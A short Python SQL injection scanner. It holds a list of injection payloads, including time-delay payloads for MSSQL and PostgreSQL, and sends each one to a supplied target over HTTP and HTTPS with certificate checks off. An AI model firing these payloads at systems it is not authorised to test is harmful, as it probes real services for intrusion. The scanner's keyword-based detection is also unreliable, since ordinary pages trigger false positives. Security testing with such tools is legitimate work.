import requests
import time

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'; SELECT pg_sleep(5)--"
]

def scan_sqli(target):
    results = []
    for scheme in ["http", "https"]:
        for param in ["id", "user", "uid"]:
            for payload in SQLI_PAYLOADS:
                url = f"{scheme}://{target}?{param}={payload}"
                try:
                    start = time.time()
                    res = requests.get(url, timeout=7, verify=False)
                    elapsed = time.time() - start
                    # Error-based detection
                    if any(x in res.text.lower() for x in ["sql", "syntax", "mysql", "you have an error", "warning"]):
                        results.append({
                            "url": url,
                            "payload": payload,
                            "type": "error-based"
                        })
                    # Time-based detection
                    if elapsed > 5:
                        results.append({
                            "url": url,
                            "payload": payload,
                            "type": "time-based"
                        })
                except Exception:
                    continue
    return {
        "vulnerable": bool(results),
        "details": results
    }